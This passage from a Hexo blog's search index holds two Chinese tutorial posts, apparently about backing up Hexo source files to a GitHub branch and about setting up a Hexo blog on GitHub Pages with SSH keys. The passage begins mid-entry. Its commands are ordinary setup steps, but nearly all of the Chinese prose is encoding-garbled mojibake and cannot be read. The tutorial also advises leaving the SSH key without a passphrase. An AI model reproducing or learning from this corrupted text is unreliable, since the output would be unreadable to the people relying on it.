ä¸ºåœ¨githubä¸­çš„æˆ‘ä»¬github.ioé¡¹ç›®æ˜¯åªæœ‰ç¼–è¯‘åŽçš„æ–‡ä»¶çš„ï¼Œæ²¡æœ‰æºæ–‡ä»¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æžœæˆ‘ä»¬çš„ç”µè„‘åäº†ï¼Œæ‰“ä¸å¼€äº†ï¼Œæˆ‘ä»¬çš„åšå®¢å°±ä¸èƒ½è¿›è¡Œæ›´æ–°äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠŠæˆ‘ä»¬çš„æºæ–‡ä»¶ä¹Ÿä¸Šä¼ åˆ°githubä¸Šã€‚è¿™ä¸ªæ—¶å€™å¯ä»¥é€‰æ‹©æ–°å»ºä¸€ä¸ªä»“åº“æ¥å­˜æ”¾æºæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æŠŠæºæ–‡ä»¶ push åˆ° user.github.io çš„å…¶ä»–åˆ†æ”¯ã€‚æˆ‘é€‰æ‹©äº†åŽè€…ã€‚åˆ›å»ºåˆ†æ”¯ åˆ›å»ºä¸¤ä¸ªåˆ†æ”¯ï¼šmaster ä¸Ž hexo,ï¼ˆè¿™ä¸ªhexoåˆ†æ”¯å°±æ˜¯å­˜æ”¾æˆ‘ä»¬æºæ–‡ä»¶çš„åˆ†æ”¯ï¼Œæˆ‘ä»¬åªéœ€è¦æ›´æ–°hexoåˆ†æ”¯ä¸Šçš„å†…å®¹æ®å°±å¥½ï¼Œmasterä¸Šçš„åˆ†æ”¯hexoç¼–è¯‘çš„æ—¶å€™ä¼šæ›´æ–°çš„ï¼‰åˆå§‹åŒ–ä»“åº“ ç„¶åŽæˆ‘ä»¬å†åˆå§‹åŒ–ä»“åº“ï¼Œé‡æ–°å¯¹æˆ‘ä»¬çš„ä»£ç è¿›è¡Œç‰ˆæœ¬æŽ§åˆ¶12git initgit remote add origin &lt;server&gt; &lt;server&gt;æ˜¯æŒ‡åœ¨çº¿ä»“åº“çš„åœ°å€ã€‚originæ˜¯æœ¬åœ°åˆ†æ”¯,remote addæ“ä½œä¼šå°†æœ¬åœ°ä»“åº“æ˜ å°„åˆ°äº‘ç«¯å°†åšå®¢æºæ–‡ä»¶ä¸Šä¼ åˆ°åˆ†æ”¯ .gitignoreæ–‡ä»¶ä½œç”¨æ˜¯å£°æ˜Žä¸è¢«gitè®°å½•çš„æ–‡ä»¶ï¼Œblogæ ¹ç›®å½•ä¸‹çš„.gitignoreæ˜¯hexoåˆå§‹åŒ–å¸¦æ¥çš„ï¼Œå¯ä»¥å…ˆåˆ é™¤æˆ–è€…ç›´æŽ¥ç¼–è¾‘ï¼Œå¯¹hexoä¸ä¼šæœ‰å½±å“ã€‚å»ºè®®.gitignoreå†…æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š123/.deploy_git/public/_config.yml .deploy_gitæ˜¯hexoé»˜è®¤çš„.gité…ç½®æ–‡ä»¶å¤¹ï¼Œä¸éœ€è¦åŒæ­¥ publicå†…æ–‡ä»¶æ˜¯æ ¹æ®sourceæ–‡ä»¶å¤¹å†…å®¹è‡ªåŠ¨ç”Ÿæˆï¼Œä¸éœ€è¦å¤‡ä»½ï¼Œä¸ç„¶æ¯æ¬¡æ”¹åŠ¨å†…å®¹å¤ªå¤š å³ä½¿æ˜¯ç§æœ‰ä»“åº“ï¼Œé™¤åŽ»åœ¨çº¿æœåŠ¡å•†å‘˜å·¥å¯ä»¥çœ‹åˆ°çš„é£Žé™©å¤–ï¼Œè¿˜æœ‰äº‘æœåŠ¡å•†è¢«æ”»å‡»é€ æˆæ³„æ¼ç­‰å¯èƒ½ï¼Œæ‰€ä»¥ä¸å»ºè®®å°†é…ç½®æ–‡ä»¶ä¼ ä¸ŠåŽ»ä¾æ¬¡æ‰§è¡Œ123git add .git commit -m "..."git push origin hexoæ›´æ”¹æ ‡ç­¾äº‘çš„é¢œè‰² æ‰“å¼€/blog/themes/next/layout/page.swigï¼Œæ‰¾åˆ°tagcloudï¼Œä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š1&#123;&#123; tagcloud(&#123;min_font: 13, max_font: 31, amount: 1000, color: true, start_color: '#9733EE', end_color: '#FF512F'&#125;) &#125;&#125; start_colorå’Œend_colorçš„é¢œè‰²ä½ å¯ä»¥è‡ªå·±éšæ„å®šä¹‰ã€‚å‚è€ƒèµ„æ–™ï¼šä½¿ç”¨ Hexo æ­å»º GitHub Page åšå®¢(äºŒ)â€“ä½¿ç”¨ GitHub åˆ†æ”¯ä¿å­˜ Hexo çŽ¯å¢ƒå’Œåšæ–‡hexo æ‘¸çˆ¬æ»šæ‰“ä¹‹è¿›é˜¶æ•™ç¨‹GitHubâ€“åˆ›å»ºæ–°çš„åˆ†æ”¯(è½¬)æ‰“é€ ä¸ªæ€§è¶…èµžåšå®¢ Hexo + NexT + GitHub Pages çš„è¶…æ·±åº¦ä¼˜åŒ–hexoçš„nextä¸»é¢˜ä¸ªæ€§åŒ–æ•™ç¨‹:æ‰“é€ ç‚«é…·ç½‘ç«™ | Moorez4å—é’±,ç”¨Github+Hexoæ­å»ºä½ çš„ä¸ªäººåšå®¢ï¼šç¾ŽåŒ–ç¯‡è¿˜æœ‰ä¸€äº›å‚è€ƒçš„èµ„æ–™é“¾æŽ¥å·²ç»æ‰¾ä¸åˆ°äº†ï¼Œæ‰€ä»¥å°±ä¸ä¸€ä¸€åˆ—å‡ºäº†ã€‚ç¬¬ä¸€æ¬¡å†™ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œæ¬¢è¿ŽæŒ‡å‡ºï¼Œä¸èƒœæ„Ÿæ¿€ã€‚]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>ä¸ªäººåšå®¢</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Github+Hexoæ­å»ºä½ çš„ä¸ªäººåšå®¢ï¼šæ­å»ºç¯‡]]></title>
    <url>%2Fposts%2F9464af1e.html%2F</url>
    <content type="text"><![CDATA[æµ·é˜”å‡­é±¼è·ƒï¼Œå¤©é«˜ä»»é¸Ÿé£ž æ—©åœ¨åˆä¸­ï¼Œå°±æƒ³ç€è‡ªå·±æ­èµ·ä¸€ä¸ªå±žäºŽè‡ªå·±çš„ç½‘ç«™ï¼Œä½†æ˜¯æ²¡æœ‰æŠ€æœ¯åˆä¸è‚¯å­¦ä¹ çš„æˆ‘ï¼Œæ€¯äºŽå°è¯•ï¼Œä¸€ç›´åœæ»žä¸å‰ã€‚å¤§å­¦æœŸé—´ç»ˆäºŽå­¦ä¹ äº†ï¼Œåˆå› ä¸ºè‡ªå·±çš„æ‡’æƒ°ï¼Œè§‰å¾—å¾ˆéš¾ï¼Œä¸è‚¯åŽ»å°è¯•ã€‚ç›´è‡³ä»Šæ—¥ï¼Œæˆ‘æƒ³è¯•ä¸€è¯•ï¼Œæ£é¼“äº†å¥½ä¸€é˜µå­ï¼Œå‘çŽ°è®¤çœŸåŽ»åšäº†ï¼Œä¹Ÿæ²¡æœ‰æƒ³è±¡ä¸­çš„éš¾ã€‚ å…¶å®žæ—©åœ¨æ”¾å‡ä¹‹å‰ï¼Œæˆ‘å°±ä¸€ç›´åœ¨æ£é¼“è‡ªå·±çš„åšå®¢äº†ï¼Œä½¿ç”¨çš„æ˜¯Djangoã€‚æžäº†å¥½ä¸€é˜µå­ï¼Œå°±åªå‰©ä¸€äº›ç»†èŠ‚çš„é—®é¢˜ï¼Œå‡†å¤‡ä¸Šçº¿çš„æ—¶å€™ï¼ŒHexoå‡ºçŽ°åœ¨æˆ‘çš„çœ¼å‰,ç®€çº¦çš„é£Žæ ¼ä¸€ä¸‹å­å¸å¼•äº†æˆ‘ï¼Œè¿™æ­£æ˜¯æˆ‘æƒ³è¦çš„ã€‚å¥½äº†ï¼Œåˆ«è¯´äº†ï¼Œæˆ‘æ”¹è¿˜ä¸è¡Œå—ï¼Œå°±è¿™æ ·æˆ‘å·²ç»æ­å¥½å‡†å¤‡ä¸Šçº¿çš„Djangoï¼Œè½¬å…¥Hexoã€‚è‡ªå·±å»ºç«™çš„åŽŸå›  ç½‘ä¸Šè¿™ä¹ˆå¤šçŽ°æˆçš„åšå®¢ä¸ç”¨ï¼Œä¸ºä»€ä¹ˆéžå¾—æµªè´¹è¿™ä¹ˆå¤šæ—¶é—´åŽ»è‡ªå·±æ­å»ºå‘¢ï¼Ÿ å¯èƒ½ä¼šæœ‰äººè¿™æ ·è¯´ï¼šå¾ˆå¤šç½‘ç«™éƒ½èƒ½å†™åšå®¢ï¼Œå¹²å˜›è¿™ä¹ˆæµªè´¹æ—¶é—´å‘¢ï¼Ÿ åœ¨è¿™é‡Œæˆ‘è¯´ä¸€ä¸‹æˆ‘æƒ³è‡ªå·±æ­å»ºçš„åŽŸå› : 1ã€ç½‘ä¸Šå¤§éƒ¨åˆ†çš„åšå®¢åŠŸèƒ½éƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œä½†æ˜¯é™åˆ¶ä¹Ÿæ˜¯æŒºå¤šçš„ï¼ŒèŠ±é‡Œèƒ¡å“¨çš„å¹¿å‘Šï¼Œæ–‡ç« ä¸ç®¡æ˜¯è‡ªå·±è¿˜æ˜¯åˆ«äººçœ‹ï¼Œä½“éªŒéƒ½å¾ˆä¸èˆ’æœã€‚ 2ã€é™¤äº†å¹¿å‘Šçš„åŽŸå› ï¼ŒæŽ’ç‰ˆçš„é™åˆ¶ä»¥å¤–ï¼Œæ‹¥æœ‰ä¸€ä¸ªè‡ªå·±å¯ä»¥éšæ„å®šåˆ¶çš„åšå®¢ç½‘ç«™ï¼Œå†…å®¹å’ŒæŽ’ç‰ˆéƒ½è‡ªå·±å¯ä»¥éšæ„å†³å®šï¼Œæ˜¯ä¸æ˜¯å¾ˆé…·ã€‚ é™¤æ­¤ä»¥å¤–ï¼Œè‡ªå·±åœ¨è¿™æ®µæ—¶é—´ç¡®å®žå­¦ä¹ åˆ°äº†å¾ˆå¤šã€‚å®…åœ¨å®¶é‡Œå¥½ä¸€æ®µæ—¶é—´ï¼Œé™¤äº†åƒé¥­ç¡è§‰å°±æ˜¯æ­å»ºè‡ªå·±çš„åšå®¢ã€‚æ­å»ºåšå®¢ä¹Ÿæ˜¯æˆä¸ºäº†æˆ‘å­¦ä¹ çš„åŠ¨åŠ›ï¼ŒçŽ°åœ¨æ­å»ºå¥½äº†ä¹‹åŽï¼Œä¹Ÿä¸ä¼šè§‰å¾—æ²¡æœ‰äº‹æƒ…å¹²ï¼Œç›¸åï¼Œä¼šå› ä¸ºåšå®¢çš„ç©ºç™½è€Œç»§ç»­åŠªåŠ›å­¦ä¹ ã€å†™åšå®¢ã€å†™è‡ªå·±çš„æƒ³æ³•ï¼ŒåŠªåŠ›è®©è‡ªå·±çš„åšå®¢ã€ç”Ÿæ´»ã€è¿˜æœ‰å­¦ä¹ å……å®žèµ·æ¥ã€‚å¼€å§‹æ­å»ºåšå®¢ä»€ä¹ˆæ˜¯Hexoï¼Ÿ Hexoæ˜¯ä¸€ä¸ªå¿«é€Ÿã€ç®€æ´ä¸”é«˜æ•ˆçš„åšå®¢æ¡†æž¶ã€‚Hexo ä½¿ç”¨ Markdownï¼ˆæˆ–å…¶ä»–æ¸²æŸ“å¼•æ“Žï¼‰è§£æžæ–‡ç« ï¼Œåœ¨å‡ ç§’å†…ï¼Œå³å¯åˆ©ç”¨é“ä¸½çš„ä¸»é¢˜ç”Ÿæˆé™æ€ç½‘é¡µã€‚çŽ¯å¢ƒéƒ¨ç½²Hexoå®‰è£…å‰æ å®‰è£… Hexo ç›¸å½“ç®€å•ã€‚ç„¶è€Œåœ¨å®‰è£…å‰ï¼Œå¿…é¡»æ£€æŸ¥ç”µè„‘ä¸­æ˜¯å¦å·²å®‰è£…ä¸‹åˆ—åº”ç”¨ç¨‹åºï¼šNode.js (Should be at least nodejs 6.9)Git å¦‚æžœä½ çš„ç”µè„‘ä¸­å·²ç»å®‰è£…ä¸Šè¿°å¿…å¤‡ç¨‹åºï¼Œé‚£ä¹ˆæ­å–œï¼æŽ¥ä¸‹æ¥åªéœ€è¦ä½¿ç”¨ npm å³å¯å®Œæˆ Hexo çš„å®‰è£…ã€‚1npm install -g hexo-cli å¦‚æžœä½ çš„ç”µè„‘ä¸­å°šæœªå®‰è£…æ‰€éœ€è¦çš„ç¨‹åºï¼Œè¯·è‡ªè¡Œç™¾åº¦æˆ–è€…Googleå®Œæˆå®‰è£…ã€‚ å®‰è£…å¥½æ‰€æœ‰çŽ¯å¢ƒä¹‹åŽï¼Œå¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤æ˜¯å¦å®‰è£…æˆåŠŸï¼Œå¦‚æžœæœ‰è¿”å›žç‰ˆæœ¬ä¿¡æ¯è¯´æ˜Žå®‰è£…æˆåŠŸã€‚123git versionnode -vnpm -vHexoå®‰è£…å®‰è£…hexo æ¡Œé¢å³é”®ç‚¹å‡»git bash hereï¼Œæ‰“å¼€gitè½¯ä»¶ç•Œé¢ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤å¹¶å›žè½¦ï¼š12npm install hexo-cli -gnpm install hexo-deployer-git --save ç¬¬ä¸€å¥æ˜¯å®‰è£…hexoï¼Œç¬¬äºŒå¥æ˜¯å®‰è£…hexoéƒ¨ç½²åˆ°git pageçš„deployerã€‚è®¾ç½®åšå®¢å­˜æ”¾çš„ç›®å½•1234hexo init /h/blogcd /h/blognpm install*æ³¨ï¼š/h/bogå¯ä»¥æ›´æ”¹ä¸ºä½ è‡ªå·±çš„æ–‡ä»¶å¤¹* æœ‰çš„æ•™ç¨‹æ˜¯å…ˆå»ºç«‹èµ·åšå®¢çš„æ–‡ä»¶å¤¹ï¼Œå†åœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹å³é”®é¼ æ ‡ï¼Œç‚¹å‡»Git Bash Hereï¼Œè¿›å…¥Gitå‘½ä»¤æ¡†ï¼Œå†æ‰§è¡Œä»¥ä¸‹æ“ä½œã€‚æ“ä½œå› äººè€Œå¼‚ï¼Œæ²¡å¤šå¤§å½±å“ï¼Œåªè¦èƒ½æˆåŠŸæ­å»ºå°±æ²¡é—®é¢˜äº†ã€‚æŸ¥çœ‹åšå®¢çš„æ•ˆæžœ è‡³æ­¤ï¼Œä¸€ä¸ªåšå®¢å°±åˆæ­¥æ­å»ºå¥½äº†ï¼Œå…ˆé¢„è§ˆä¸€ä¸‹ï¼š1hexo g &amp;&amp; hexo s ç„¶åŽåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ï¼šlocalhost:4000å°±å¯ä»¥çœ‹åˆ°åšå®¢çš„æ ·å­äº†ã€‚ æ‰“å¼€è¯¥ç½‘å€ï¼Œä½ å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ç¯‡é»˜è®¤çš„åšå®¢ï¼šHello Worldã€‚è™½ç„¶çœ‹èµ·æ¥æœ‰ç‚¹éš¾çœ‹ï¼Œä½†æ˜¯åŽç»­æˆ‘ä»¬å¯ä»¥é€šè¿‡é‡æ–°é€‰æ‹©æ¨¡æ¿æ¥å¯¹åšå®¢è¿›è¡Œç¾ŽåŒ–ã€‚æŠŠåšå®¢éƒ¨ç½²åˆ°GitHubGithubè´¦å·æ³¨å†ŒåŠé…ç½® å¦‚æžœä½ æ²¡æœ‰githubå¸å·ï¼Œå°±æ–°å»ºä¸€ä¸ªï¼Œç„¶åŽåŽ»é‚®ç®±è¿›è¡ŒéªŒè¯ï¼›å¦‚æžœä½ æœ‰å¸å·åˆ™ç›´æŽ¥ç™»å½•ã€‚å®˜ç½‘ï¼šhttps://github.com/å»ºç«‹new repository åªå¡«å†™username.github.ioå³å¯ï¼Œç„¶åŽç‚¹å‡»create repositroryã€‚ æ³¨æ„ï¼šusername.github.io çš„usernameè¦å’Œç”¨æˆ·åä¿æŒä¸€è‡´ï¼Œä¸ç„¶åŽé¢ä¼šå¤±è´¥ã€‚ä»¥æˆ‘çš„ä¸ºä¾‹ï¼šå¼€å¯gh-pagesåŠŸèƒ½ ç‚¹å‡»githubä¸»é¡µç‚¹å‡»å¤´åƒä¸‹é¢çš„profile,æ‰¾åˆ°æ–°å»ºç«‹çš„username.github.ioæ–‡ä»¶æ‰“å¼€ï¼Œç‚¹å‡»settingsï¼Œå¾€ä¸‹æ‹‰åŠ¨é¼ æ ‡åˆ°GitHub Pagesã€‚å¦‚æžœä½ çœ‹åˆ°ä¸Šæ–¹å‡ºçŽ°ä»¥ä¸‹è­¦å‘Šï¼šGitHub Pages is currently disabled. You must first add content to your repository before you can publish a GitHub Pages site ä¸ç”¨ç®¡ï¼Œç‚¹å‡»é€‰æ‹©choose a themeï¼Œéšä¾¿é€‰æ‹©ä¸€ä¸ªï¼Œç„¶åŽselect themeä¿å­˜å°±è¡Œäº†ã€‚é…ç½®sshå¯†é’¥ é…ç½®Githubçš„SSHå¯†é’¥å¯ä»¥è®©æœ¬åœ°gité¡¹ç›®ä¸Žè¿œç¨‹çš„githubå»ºç«‹è”ç³»ï¼Œè®©æˆ‘ä»¬åœ¨æœ¬åœ°å†™äº†ä»£ç ä¹‹åŽç›´æŽ¥é€šè¿‡gitæ“ä½œå°±å¯ä»¥å®žçŽ°æœ¬åœ°ä»£ç åº“ä¸ŽGithubä»£ç åº“åŒæ­¥ã€‚æ“ä½œå¦‚ä¸‹ï¼šçœ‹çœ‹æ˜¯å¦å­˜åœ¨SSHå¯†é’¥ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦çœ‹çœ‹æ˜¯å¦çœ‹çœ‹æœ¬æœºæ˜¯å¦å­˜åœ¨SSH keys,æ‰“å¼€Git Bash,å¹¶è¿è¡Œï¼š1cd ~/. ssh æ£€æŸ¥ä½ æœ¬æœºç”¨æˆ·homeç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨.sshç›®å½• å¦‚æžœï¼Œä¸å­˜åœ¨æ­¤ç›®å½•ï¼Œåˆ™è¿›è¡Œç¬¬äºŒæ­¥æ“ä½œï¼Œå¦åˆ™ï¼Œä½ æœ¬æœºå·²ç»å­˜åœ¨sshå…¬é’¥å’Œç§é’¥ï¼Œå¯ä»¥ç•¥è¿‡ç¬¬äºŒæ­¥ï¼Œç›´æŽ¥è¿›å…¥ç¬¬ä¸‰æ­¥æ“ä½œã€‚åˆ›å»ºä¸€å¯¹æ–°çš„SSHå¯†é’¥12$ssh-keygen -t rsa -C "your_email@example.com"#è¿™å°†æŒ‰ç…§ä½ æä¾›çš„é‚®ç®±åœ°å€ï¼Œåˆ›å»ºä¸€å¯¹å¯†é’¥ï¼Œè®°å¾—ä¿®æ”¹ ç›´æŽ¥å›žè½¦ï¼Œåˆ™å°†å¯†é’¥æŒ‰é»˜è®¤æ–‡ä»¶è¿›è¡Œå­˜å‚¨ã€‚æ­¤æ—¶ä¹Ÿå¯ä»¥è¾“å…¥æŒ‡å®šçš„æ–‡ä»¶å¤¹ã€‚ç„¶åŽæ ¹æ®æç¤ºï¼Œä½ éœ€è¦è¾“å…¥å¯†ç å’Œç¡®è®¤å¯†ç ï¼Œå…¶å®žå¯ä»¥ä¸ç”¨å¯†ç ï¼Œå°±æ˜¯åˆ°è¾“å¯†ç çš„åœ°æ–¹ï¼Œéƒ½ç›´æŽ¥å›žè½¦ï¼Œæ‰€ä»¥æ¯æ¬¡pushå°±åªç®¡å›žè½¦å°±è¡Œäº†ã€‚è·Ÿç€æç¤ºæ“ä½œå°±å¯¹äº†ï¼Œè¿™é‡Œæ²¡ä»€ä¹ˆå‘ã€‚åœ¨GitHubè´¦æˆ·ä¸­æ·»åŠ å…¬é’¥ è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¹¶å°†å…¬é’¥çš„å†…å®¹å¤åˆ¶ã€‚1clip &lt; ~/.ssh/id_rsa.pubç™»é™†GitHubï¼Œè¿›å…¥è´¦æˆ·è®¾ç½®ï¼Œåœ¨SSH Keysç²˜è´´æ·»åŠ å°±å¯ä»¥äº†æµ‹è¯• è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œçœ‹çœ‹[è®¾ç½®æ˜¯å¦æˆåŠŸï¼Œgit@github.comçš„éƒ¨åˆ†ä¸è¦ä¿®æ”¹ï¼š1$ ssh -T git@github.comThe authenticity of host â€˜github.com (207.97.227.239)â€™ canâ€™t be established.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.Are you sure you want to continue connecting (yes/no)? å¦‚æžœæ˜¯ç¬¬ä¸€æ¬¡çš„ä¼šæç¤ºæ˜¯å¦continueï¼Œè¾“å…¥yeså°±ä¼šçœ‹åˆ°ï¼šYouâ€™ve successfully authenticated, but GitHub does not provide shell access ã€‚è¿™å°±è¡¨ç¤ºå·²æˆåŠŸè¿žä¸Šgithubã€‚è®¾ç½®ç”¨æˆ·ä¿¡æ¯ çŽ°åœ¨ä½ å·²ç»å¯ä»¥é€šè¿‡SSHé“¾æŽ¥åˆ°GitHubäº†ï¼Œè¿˜æœ‰ä¸€äº›ä¸ªäººä¿¡æ¯éœ€è¦å®Œå–„çš„ã€‚ Gitä¼šæ ¹æ®ç”¨æˆ·çš„åå­—å’Œé‚®ç®±æ¥è®°å½•æäº¤ã€‚GitHubä¹Ÿæ˜¯ç”¨è¿™äº›ä¿¡æ¯æ¥åšæƒé™çš„å¤„ç†ï¼Œè¾“å…¥ä¸‹é¢çš„ä»£ç è¿›è¡Œä¸ªäººä¿¡æ¯çš„è®¾ç½®ï¼ŒæŠŠåç§°å’Œé‚®ç®±æ›¿æ¢æˆä½ è‡ªå·±çš„ï¼Œåå­—æ ¹æ®è‡ªå·±çš„å–œå¥½è‡ªå·±å–ï¼Œè€Œä¸æ˜¯GitHubçš„æ˜µç§°ã€‚12$ git config --global user.name "ä½ çš„ç”¨æˆ·å"//ç”¨æˆ·å$ git config --global user.email "ä½ çš„é‚®ç®±"//å¡«å†™è‡ªå·±çš„é‚®ç®±å°†æœ¬åœ°çš„Hexoæ–‡ä»¶æ›´æ–°åˆ°GitHubçš„åº“ä¸­ SSH Keyé…ç½®æˆåŠŸåŽï¼ŒæŽ¥ä¸‹æ¥æˆ‘ä»¬è¦æŠŠæœ¬åœ°çš„Hexoæ–‡ä»¶ä¸Šä¼ åˆ°GitHubåº“ä¸­ã€‚ æ‰“å¼€Hexoæ–‡ä»¶å¤¹ä¸‹çš„_config.ymlï¼Œè¿™ä¸ªæ˜¯åšå®¢çš„é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä½ çš„GitHub page url ç„¶åŽæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š1hexo g &amp;&amp; hexo d æˆ–è€… hexo g -d æ­¤æ—¶åœ¨æµè§ˆå™¨æ‰“å¼€ä½ çš„ä¸»é¡µåœ°å€ï¼Œä½ å°±èƒ½çœ‹åˆ°ä½ çš„åšå®¢äº†ã€‚å†™ä¸‹è‡ªå·±çš„ç¬¬ä¸€ç¯‡åšå®¢ æŽ¥ä¸‹æ¥ä½ å¯ä»¥åœ¨åšå®¢çš„æ ¹ç›®å½•ä¸‹è¿è¡Œå‘½ä»¤ï¼š1hexo new "ç¬¬ä¸€ç¯‡åšå®¢" ç„¶åŽæ‰“å¼€D:\blog\source\_postsæ–‡ä»¶å¤¹ï¼Œå°±å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç¬¬ä¸€ç¯‡åšå®¢.mdçš„æ–‡ä»¶ï¼Œç”¨æ”¯æŒmarkdownè¯­æ³•çš„è½¯ä»¶æ‰“å¼€è¯¥æ–‡ä»¶è¿›è¡Œç¼–è¾‘å³å¯ã€‚ ç¼–è¾‘å¥½ä»¥åŽï¼Œè¿è¡Œä¸‹è¿°å‘½ä»¤ï¼š1hexo clean &amp;&amp; hexo d -g ç„¶åŽï¼Œåœ¨ç½‘å€ä¸­è¾“å…¥username.github.ioå³å¯çœ‹åˆ°ä½ çš„åšå®¢ä¸Šï¼Œå‡ºçŽ°â€œç¬¬ä¸€ç¯‡åšå®¢â€è¿™ç¯‡æ–°çš„æ–‡ç« ã€‚ è‡³æ­¤ï¼Œä½ çš„ä¸ªäººåšå®¢åˆæ­¥æ­å»ºè¿‡ç¨‹å°±å®Œæˆäº†ã€‚ç›¸å…³è¡¥å…… åœ¨ä»¥åŽçš„åšå®¢å‘å¸ƒï¼Œéƒ½æ˜¯éœ€è¦ä½¿ç”¨Markdownè¯­æ³•åŽ»å†™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹markdownæœ‰æ‰€äº†è§£ã€‚ å…³äºŽmarkdownçš„è¯­æ³•ä»‹ç»å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼šmarkdownâ€”â€”å…¥é—¨æŒ‡å— å½“ä½ å¤§è‡´äº†è§£markdownè¯­æ³•åŽï¼Œå¦‚ä½•ç”¨markdownå†™åšå®¢å‘¢ï¼Ÿä¸å¦¨å‚è€ƒè¿™ä¸¤ç¯‡è¯¦ç»†æ•™ç¨‹ï¼šMarkdownè¯­æ³•è¯´æ˜ŽHexoä¸‹çš„Markdownè¯­æ³•(GFM)å†™åšå®¢ æŽ¥ä¸‹æ¥ä½ è¿˜å¾—éœ€è¦ä¸€ä¸ªé«˜æ•ˆçš„markdownè½¯ä»¶ï¼Œè¿™é‡Œæˆ‘æ˜¯ç”¨çš„æ˜¯Typoraï¼Œå®‰è£…å¥½åŽå°±å¯ä»¥æ‰“å¼€åˆšåˆšçš„ç¬¬ä¸€ç¯‡åšå®¢.mdï¼Œå¼€å§‹å°è¯•å†™ä½ çš„ç¬¬ä¸€ç¯‡åšå®¢äº†ã€‚ å†™å®Œä¹‹åŽï¼Œåˆ«å¿˜äº†åœ¨åšå®¢æ ¹ç›®å½•ä¸‹å†æ¬¡è¿è¡Œï¼š1hexo clean &amp;&amp; hexo d -g åˆ°è¿™é‡Œï¼Œåšå®¢çš„åˆæ­¥æ­å»ºå°±ç®—å®Œæˆäº†ï¼Œå¦‚æžœä¸­é—´å‡ºçŽ°å·®é”™ï¼Œè¯·ä¿æŒè€å¿ƒå¤šè¯•å‡ æ¬¡ï¼ŒåŠžæ³•æ€»æ¯”é—®é¢˜å¤šå˜›ï¼å…³äºŽHexoçš„ä¸€äº›äº†è§£å’Œå¸¸ç”¨å‘½ä»¤ï¼Œè¯·è‡ªè¡ŒæŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼Œä¸€èˆ¬å¯è§£å†³å¤§éƒ¨åˆ†çš„é—®é¢˜ã€‚ æ­¤æ—¶ï¼Œè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„é—®é¢˜å°±æ˜¯ï¼Œåšå®¢çš„ç¾ŽåŒ–é—®é¢˜ï¼Œä¸‹ä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘ä¼šä»¥æˆ‘çš„åšå®¢ä¸ºä¾‹ï¼Œè®²ä¸€è®²æˆ‘çš„åšå®¢æ˜¯å¦‚ä½•è¿›è¡Œç¾ŽåŒ–çš„ã€‚ ç¬¬ä¸€æ¬¡å†™åšå®¢ï¼Œå¦‚æœ‰é—®é¢˜ï¼Œæ¬¢è¿ŽæŒ‡å‡ºï¼Œè°¢è°¢å„ä½å¤§ä½¬ï¼Œæˆ‘ä¼šç»§ç»­åŠªåŠ›çš„ã€‚]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>ä¸ªäººåšå®¢</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
